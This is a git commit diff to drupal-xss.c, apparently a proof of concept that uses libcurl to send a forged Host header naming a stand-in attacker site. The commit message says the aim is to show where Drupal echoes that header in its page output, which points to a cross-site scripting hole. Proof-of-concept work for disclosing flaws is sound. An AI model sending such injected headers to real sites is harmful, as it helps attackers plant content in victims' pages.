65b17b172d650305a3c6955c0d350fe9facd656a
James Cuzella <james.cuzella@lyraphase.com>
2011-12-06 13:44:07 -0700

    Use custom Host header to demonstrate where in the drupal page output it is shown

--- drupal-xss.c
+++ drupal-xss.c
@@ -14,8 +14,17 @@ int main(int argc, char *argv[])
   curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/7.21.6 (x86_64-pc-linux-gnu) libcurl/7.21.6 OpenSSL/1.0.0e zlib/1.2.3.4 libidn/1.22 librtmp/2.3");
   curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
   curl_easy_setopt(hnd, CURLOPT_VERBOSE, 1L);
+
+  /* Set custom Host header */
+  struct curl_slist *headers=NULL; /* init to NULL is important */
+  headers = curl_slist_append(headers, "Host: attackersite.scripts.example.com");
+  /* headers = curl_slist_append(headers, "X-more-headers-here: text"); */
+  curl_easy_setopt(hnd, CURLOPT_HTTPHEADER, headers);/* pass our list of custom made headers */  
+  
   ret = curl_easy_perform(hnd);
   curl_easy_cleanup(hnd);
+
+  curl_slist_free_all(headers); /* free the header list */
 
   return (int)ret;
 }
